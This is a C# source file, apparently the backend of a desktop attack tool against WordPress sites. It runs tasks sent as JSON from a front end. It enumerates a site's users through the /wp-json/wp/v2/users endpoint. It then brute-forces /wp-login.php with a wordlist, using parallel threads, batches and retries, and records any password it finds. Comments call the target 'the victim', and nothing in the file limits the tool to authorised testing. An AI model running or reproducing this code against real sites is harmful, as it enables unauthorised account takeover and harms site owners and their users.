﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace react_background_service
{
    class Program
    {
        private static readonly List<Task> ProcessList = new List<Task>();
        
        private static void SendStatus()
        {
            Console.WriteLine(JsonConvert.SerializeObject(ProcessList));
        }

        private static void ReportTimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            SendStatus();
        }

        private static long GetTime()
        {
            DateTime utcNow = DateTime.UtcNow;
            DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Local);
            return (long)((utcNow - epoch).TotalMilliseconds);
        }

        static System.Threading.Tasks.Task Main()
        {
            var reportTimer = new System.Timers.Timer {Interval = 2000};
            reportTimer.Elapsed += ReportTimerElapsed;
            reportTimer.Start();
            
            while (true) // main loop
            {
                // get new commands from front end
                var command = Console.ReadLine();

                if (command != null) // we have a new command
                {
                    var action = JsonConvert.DeserializeObject<Task>(command);

                    if (action.MessageAction == Action.Stop)
                    {
                        var index = ProcessList.FindIndex(a => a.Id == action.Id);
                        var process = ProcessList[index];
                        process.TaskStatus = Status.Stopped;
                    }

                    if (action.MessageAction == Action.Add)
                    {
                        var id = 1;
                        if (ProcessList.Count > 0)
                        {
                            id = ProcessList.Max(x => x.Id) + 1;
                        }

                        ProcessList.Add(new Task()
                        {
                            Id = id,
                            Name = action.Name,
                            Percentage = 0,
                            Url = action.Url,
                            TimeStart = GetTime(),
                            TaskStatus = Status.Starting,
                            TaskType = action.TaskType,
                            MessageAction = Action.Ping,
                            Username = action.Username,
                            Wordlist = action.Wordlist,
                            TaskResult = new Result()
                            {
                                UserEnumeration = new List<UserObj>(), 
                                BruteForce = new LoginCredentials()
                            },
                            Options = new Options()
                            {
                                BruteForceOptions = new BruteForceOptions()
                                {
                                    BatchCount = action.Options.BruteForceOptions.BatchCount,
                                    MaxThreads = action.Options.BruteForceOptions.MaxThreads,
                                    RetryCount = action.Options.BruteForceOptions.RetryCount,
                                }
                            },
                            
                        });

                        // check the victim is alive
                        var isAlive = false;
                        try
                        {
                            HttpWebRequest checkEeq = (HttpWebRequest)WebRequest.Create(action.Url);
                            var checkResponse = (HttpWebResponse)checkEeq.GetResponse();
                            isAlive = checkResponse.StatusCode != (HttpStatusCode.BadRequest | HttpStatusCode.NotFound | HttpStatusCode.InternalServerError);
                            checkResponse.Close();
                        } catch
                        {
                            isAlive = false;
                        }


                        if (!isAlive)
                        {
                            var index = ProcessList.FindIndex(x => x.Id == id);
                            var proc = ProcessList[index];
                            proc.TaskStatus = Status.Stopped;
                            proc.Exception = "INVALID_URL_EXCEPTION";
                        }

                        SendStatus();

                        // USER ENUMERATION
                        if (action.TaskType == Type.Enumeration && isAlive)
                        {
                            var enumTask = new System.Threading.Tasks.Task(async () =>
                            {
                                // ToDo: [enumTask Task Cancellation]
                                var index = ProcessList.FindIndex(a => a.Id == id);
                                var process = ProcessList[index];

                                ProcessList[index].TaskStatus = Status.Running;

                                var client = new HttpClient();
                                var response = await client.GetAsync(process.Url + "/wp-json/wp/v2/users");
                                response.EnsureSuccessStatusCode();
                                var responseBody = await response.Content.ReadAsStringAsync();
                                var list = JsonConvert.DeserializeObject<List<UserObj>>(responseBody);

                                // save result
                                ProcessList[index].TaskResult.UserEnumeration = list;

                                // update task status
                                ProcessList[index].TaskStatus = Status.Ready;
                                ProcessList[index].Percentage = 100;

                                //SendStatus();
                            });
                            enumTask.Start();
                        }

                        // BRUTE FORCE ATTACK
                        if (action.TaskType == Type.BruteForce && isAlive)
                        {
                            var bruteTask = new System.Threading.Tasks.Task(() =>
                            {
                                var index = ProcessList.FindIndex(a => a.Id == id);
                                var process = ProcessList[index];

                                ProcessList[index].TaskStatus = Status.Running;

                                var uri = process.Url + "/wp-login.php";
                                var username = process.Username;
                                var wordListPath = process.Wordlist;
                                var maxThreads = process.Options.BruteForceOptions.MaxThreads;
                                var batchCount = process.Options.BruteForceOptions.BatchCount;
                                var retryCount = process.Options.BruteForceOptions.RetryCount;
                                var found = false;
                                var watch = Stopwatch.StartNew();

                                var la = new LoginAttempt(new Uri(uri));
                                using var sr = new StreamReader(wordListPath);

                                void Update(decimal percentage, long seconds)
                                {
                                    var remaining = TimeSpan.FromSeconds(seconds);
                                    var progress = $"{percentage * 100:0.0000}";

                                    process.Percentage = Convert.ToDouble(percentage * 100);
                                    process.TimeRemaining = remaining;
                                }

                                while (!sr.EndOfStream)
                                {
                                    if (process.TaskStatus == Status.Stopped) break;
                                    
                                    var buffer = new List<string>();
                                    for (var i = 0; i < batchCount; i++)
                                    {
                                        buffer.Add(sr.ReadLine());
                                    }

                                    var percentage = (decimal)sr.BaseStream.Position / sr.BaseStream.Length;
                                    var percentsPerSecond = percentage / (decimal)watch.Elapsed.TotalSeconds;
                                    var remainingSeconds = (long)((1 - percentage) / percentsPerSecond);
                                    Update(percentage, remainingSeconds);

                                    Parallel.ForEach(buffer, new ParallelOptions { MaxDegreeOfParallelism = maxThreads }, password =>
                                    {
                                        var currentRetry = 0;
                                        for (; ; ) // retry pattern
                                        {
                                            if (process.TaskStatus == Status.Stopped) break; // cancel task if messageAction was changed to stop
                                            
                                            try
                                            {
                                                if (!la.LoginAttemptAsync(username, password).GetAwaiter().GetResult()) return;
                                                // password found!
                                                found = true;
                                                process.TaskStatus = Status.Ready;
                                                process.TaskResult.BruteForce.Password = password;
                                                process.TaskResult.BruteForce.Username = username;
                                                break;
                                            }
                                            // ToDo: [Brute Force Exception handler] Keep trying if the exception may be temporary. Stop trying if not.
                                            catch
                                            {
                                                currentRetry++;

                                                if (currentRetry > retryCount) break; // not work, stop trying.
                                                Thread.Sleep(1000 * currentRetry);
                                            }
                                        }
                                    });

                                    // report completion time
                                    process.CompletionTime = GetTime();
                                    if (found) return;
                                }

                                if (found) return;

                                // Password not found or process cancelled.
                                if (process.TaskStatus != Status.Stopped)
                                    process.TaskStatus = Status.Ready;

                                process.TaskResult.BruteForce.Username = username;
                                process.TaskResult.BruteForce.Password = "Password not found";

                            });
                            bruteTask.Start();
                        }
                    }

                    if (action.MessageAction == Action.Remove)
                    {
                        var item = ProcessList.SingleOrDefault(x => x.Id == action.Id);
                        if (item != null) ProcessList.Remove(item);
                    }
                }
            }
        }
    }
}
